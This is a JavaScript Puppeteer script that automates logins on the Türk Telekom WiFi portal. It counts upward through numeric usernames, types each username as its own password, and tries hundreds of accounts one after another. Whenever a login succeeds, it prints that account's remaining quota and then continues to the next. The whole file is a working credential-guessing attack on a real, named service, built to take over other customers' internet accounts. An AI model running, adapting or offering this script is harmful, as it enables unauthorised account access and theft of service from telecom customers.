const puppeteer = require('puppeteer');

// skips first two numbers
var user = 2110370;
var howManyTrys = 500;

var accountFound = false;
const url = "https://giris.turktelekomwifi.com/#/login/adsl";

const TTMusteri_Button = "#accordingMenuButton";
const Internet_Button = "#according-menu > button:nth-child(1)";
const InternetGiris_Button = "#adslBtn";

const checkBox = 'input[name="termsCheckBox"]';
const userName_InputField = "#adslUsername";
const password_InputField = 'input[name="password"]';
const login_Button = "#loginBtn:not([disabled])";

const exitButton = "a[data-autamation=\"cikis\"]";
const tableContent = "td.alert-link";

async function findInternet(){

	const page = await startBrowser();

	while (howManyTrys !== 0) {

        try {
            await fillForm(page);	
        } catch (error) {
            await exitAccount(page);
        }
	
		await showQuota(page);
        await navigateSite(page);
	}
}

async function startBrowser(){

	const browser = await puppeteer.launch({
		headless: true,
		defaultViewport: null
		//slowMo: 100 //slow down every action by 100ms 
	});

	const _page = await browser.newPage();

	await _page.goto(url,{
		waitUntil: "domcontentloaded"
	});
	return _page;
}


async function navigateSite(page){

	await page.waitForSelector(TTMusteri_Button);
	await page.click(TTMusteri_Button);

	await page.waitForSelector(Internet_Button);
	await page.click(Internet_Button);

	await page.waitForSelector(InternetGiris_Button);
	await page.click(InternetGiris_Button);
}

async function fillForm(page){

	await page.waitForSelector(checkBox);
	await page.click(checkBox);

	while (!accountFound && (howManyTrys !== 0)) {

		howManyTrys -= 1;
		user += 1;
        console.log(user);

	    // clear input field
		async function clear(page, selector) {
			await page.evaluate(selector => {
			document.querySelector(selector).value = "";
			}, selector);
		}

		await page.waitForSelector(userName_InputField);
		await page.waitForSelector(password_InputField);

		await clear(page, userName_InputField);
		await clear(page, password_InputField);

		await page.type(userName_InputField, user.toString());
		await page.type(password_InputField, user.toString());		

		await page.waitForSelector(login_Button, {timeout:4000});
		await page.click(login_Button);
	}

}

async function exitAccount(page){

	await page.waitForSelector(exitButton);
	page.click(exitButton);

	accountFound = false;
    await setTimeout(() => {console.log("exiting")},2000);
    //await page.goto(url);
}

async function showQuota(page) {

	await page.waitForSelector(tableContent);
    const table = await page.evaluate(async() => {
        const tds = Array.from(document.querySelectorAll("td.alert-link"))
        return tds.map(td => td.innerText)
    });
    console.log(table);
}

findInternet();